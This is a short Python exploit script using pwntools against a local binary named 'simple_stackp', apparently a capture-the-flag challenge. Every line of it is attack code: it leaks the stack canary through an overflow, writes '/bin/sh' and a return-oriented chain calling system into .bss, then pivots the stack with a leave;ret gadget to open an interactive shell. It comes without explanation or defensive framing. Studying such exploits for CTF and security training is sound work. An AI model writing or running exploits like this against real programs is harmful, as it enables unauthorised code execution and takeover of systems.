from pwn import *

context.binary = "./simple_stackp"
p = process()

# 1. Leak canary
p.sendlineafter(b"-9.", b"129")
payload = b"A" * 128
p.send(payload)
p.recvuntil(b"A" * 128)
canary = b"\x00" + p.recv(7)

# 2. Write ROP chain to .bss
bss = 0x404000
pop_rdi = 0x401123
system_plt = 0x401050
binsh = bss + 0x100

p.sendlineafter(b"-9.", b"256")
p.send(b"/bin/sh\x00" + flat([pop_rdi, binsh, system_plt]))

# 3. Stack pivot
leave_ret = 0x401012
payload = b"A" * 128 + canary + p8(0x00) + p64(leave_ret)
p.sendlineafter(b"fun?", b"129")
p.send(payload)
p.interactive()